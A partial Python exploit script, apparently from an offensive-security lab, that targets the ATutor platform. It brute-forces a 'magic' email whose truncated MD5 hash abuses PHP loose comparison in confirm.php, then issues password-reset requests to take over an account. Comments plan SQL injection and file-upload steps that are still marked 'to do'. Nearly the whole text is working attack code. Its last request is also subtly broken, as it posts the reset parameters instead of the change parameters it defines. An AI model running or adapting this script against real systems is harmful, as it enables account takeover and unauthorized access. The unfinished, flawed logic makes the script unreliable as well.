import hashlib, string, itertools, re, sys, requests

##
# 1. use sqli to pull account creation date
# to do
# 2. generate magic email
def gen_code(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase,repeat=int(prefix_length))):
        words_combined = "%s@%s" % (word, domain) + date + id
        hash = hashlib.md5(words_combined.encode("latin1")).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print("(+) Found a valid email! %s@%s" % (word, domain))
            print("(+) Requests made: %d" % count)
            print("(+) Equivalent loose comparison: %s == 0\n" % (hash))
            print("(+) Founding a hash")
            email = F"{word}@{domain}"
            url = "http://%s/ATutor/confirm.php?e=%s&m=0&id=%s" % ('atutor', email, id)
            print ("(*) Issuing update request to URL: %s" % url)
            r = requests.get(url, allow_redirects=False)
#           r = requests.get(url, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
            if (r.status_code == 302):
                return (True, email, count)
        count += 1
    return (False,'',count)
# 3. reset email to magic email
#to do
# 4. submit forgetten password request not hardcode form_email
pw_reset_url='http://atutor/Atutor/password_reminder.php'
pw_reset_params = {"form_password_reminder": "true", "form_email": "dlv@offsec.local", "submit": "Submit"}
requests.post(pw_reset_url, data=pw_reset_params)
# returns a 302 (redirect on success)
# 5. get reset link from atmail email
# 7. change password
pw_reset_url='http://atutor/Atutor/password_reminder.php'
pw_change_params = {"form_change": "true", "id": "1", "g": "19262", "h": "238e5f23be70c47", "form_password_hidden": "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e", "password_error": '', "password": '', "password2": '', "submit": "Submit"}
requests.post(pw_reset_url, data=pw_reset_params)
# 8. login and reuse file upload vuln
#to do


















